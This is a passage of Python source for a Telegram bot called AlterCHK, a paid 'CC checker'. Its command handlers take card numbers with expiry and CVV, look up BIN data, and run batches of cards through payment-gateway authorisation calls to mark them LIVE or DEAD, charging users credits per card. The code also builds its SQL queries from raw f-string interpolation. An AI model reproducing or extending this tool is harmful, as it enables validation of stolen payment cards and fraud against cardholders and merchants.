    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    now = datetime.datetime.now()
    current_datetime = now.strftime("%Y-%m-%d %H:%M:%S")
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING MASS 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n↯ Start Time: <code>{current_datetime}</code>\n↯ Gateway: {TwoNameGateway} | ↯ CCS Detected: <code>{len(CcVerify)}</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        async def main(lista):
            import certifi
            import ssl
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(connector=conn) as session:
                    mylist = lista.split('\n')
                    tasks = []
                    for x in range(len(mylist)):
                        splitter = mylist[x].split('|')
                        ccnum    = splitter[0]
                        mes      = splitter[1]
                        ano      = splitter[2]
                        cvv      = splitter[3]
                        tasks.append(asyncio.ensure_future(get_stripeauth(session=session, cc=ccnum, month=mes, year=ano, cvv=cvv)))
                    original_pokemon = await asyncio.gather(*tasks)
                    return original_pokemon
        finalr = await main('\n'.join(CcVerify))
        finalr = ("\n- - - - - - - - - - - - - - - - - - - - -\n".join(finalr))
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            total_count = finalr.count("LIVE ✅") + finalr.count("DEAD ❌")
            result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            Credits = result['Creditos']
            new_credits = int(Credits) - int(total_count)
            await ConnectDB.run_query(f"UPDATE pruebas SET Creditos='{new_credits}' WHERE ID='{message.from_user.id}'")
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n{finalr}</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["massop"])
async def CMDmasstr(message: types.Message):
    NameGateway = 'Gateway 🔥 Unknown [ CCN Auth ]'
    TwoNameGateway = 'Unkown'
    ThreeGateway = 'Gateway 🔥 Unknown CCN [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('massop')
    if WaitStatus[0] in ['OFFLINE ❌', 'OFFLINE1 ❌']:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter) as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if await VerifyBanned(str(message.from_user.id)) == 'Yes':
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>You are banned from this bot.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    VerMessage = message.text
    if message.reply_to_message:
        VerMessage = message.reply_to_message.text
    if len(re.findall(r'\d', VerMessage)) >= 15:
        pass

    if not any(char.isdigit() for char in VerMessage):
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        
    result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    result = json.loads(json.dumps(result[0]))
    Credits = result['Creditos']
    if int(Credits) < 10:
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>Insufficient Credits.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheckMASS(re.sub("[^\d\n]", " ", VerMessage))
    if len(CcVerify) > 10:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThis command only supports 10 ccs!\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    for cc in CcVerify:
        try:
            result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{cc[0:6]}'")
            result = json.loads(json.dumps(result[0]))
            type = result['type']
            level = result['level']
            brand = result['brand']
            bank = result['bank']
            country = result['country']
            emoji = result['Emoji']
        except IndexError:
            try:
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                # await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                # await asyncio.sleep(e.value)
                return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{cc}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
        rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{cc[0:6]}'")
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if rbin:
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nBin ↯ <code>{cc[0:6]} ({emoji})</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    now = datetime.datetime.now()
    current_datetime = now.strftime("%Y-%m-%d %H:%M:%S")
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING MASS 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n↯ Start Time: <code>{current_datetime}</code>\n↯ Gateway: {TwoNameGateway} | ↯ CCS Detected: <code>{len(CcVerify)}</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        async def main(lista):
            import certifi
            import ssl
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(connector=conn) as session:
                    mylist = lista.split('\n')
                    tasks = []
                    for x in range(len(mylist)):
                        splitter = mylist[x].split('|')
                        ccnum    = splitter[0]
                        mes      = splitter[1]
                        ano      = splitter[2]
                        cvv      = splitter[3]
                        tasks.append(asyncio.ensure_future(get_stripeauth_3(session=session, cc=ccnum, month=mes, year=ano, cvv=cvv)))
                    original_pokemon = await asyncio.gather(*tasks)
                    return original_pokemon
        finalr = await main('\n'.join(CcVerify))
        finalr = ("\n- - - - - - - - - - - - - - - - - - - - -\n".join(finalr))
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            total_count = finalr.count("LIVE ✅") + finalr.count("DEAD ❌")
            result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            Credits = result['Creditos']
            new_credits = int(Credits) - int(total_count)
            await ConnectDB.run_query(f"UPDATE pruebas SET Creditos='{new_credits}' WHERE ID='{message.from_user.id}'")
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n{finalr}</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["ki"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Kyu [ 1$ ]'
    TwoNameGateway = 'Gateway ↯ Kyu [ 1$ ]'
    ThreeGateway = 'Gateway 🔥 Kyu [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('ki')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
